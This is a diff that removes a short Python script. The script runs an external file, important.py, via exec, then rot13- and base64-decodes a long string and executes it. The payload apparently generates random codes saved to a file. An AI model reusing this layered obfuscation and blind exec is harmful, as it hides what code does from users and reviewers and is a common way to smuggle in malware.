@@ -1,5 +1,0 @@
-import base64, codecs
-exec(open("important.py").read())
-generator = 'nJ1jo3W0VUWuozEioFjtp3ElnJ5aPtchqJ1vMKVtCFOcoaO1qPtvHTkyLKAyVTyhpUI0VUEbMFOuoJ91oaDto2LtL29xMKZtrJ91VUqcp2ttqT8tM2IhMKWuqTH6VPVcPzL9o3OyovtvHT9mp2yvoTHtD29xMKZhqUu0VvjtVapvYPOyozAiMTyhMm0aqKEzYGtaXDbXMz9lVTxtnJ4tpzShM2HbnJ50XT51oJWypvxcBtbtVPNtrFN9VPpaYzcinJ4bpzShMT9gYzAbo2ywMFumqUWcozphLKAwnJysqKOjMKWwLKAyVPftp3ElnJ5aYzEcM2y0plNeVUA0pzyhMl5up2AcnI9fo3qypzAup2HcVTMipvOsVTyhVUWuozqyXQR2XFxXVPNtVUNtCFqbqUEjpmbiY2Ecp2AipzDhM2yzqP8aPvNtVPO0VQ0tpUWcoaDbpPNeVUxcPvNtVPOzYaqlnKEyXUNcPvNtVPOzYaqlnKEyXUxcPvNtVPOzYaqlnKEyXPWpovVc'
-gen = eval('codecs.decode(generator, "rot13")')
-eval(compile(base64.b64decode(eval('gen')), '<string>', 'exec'))
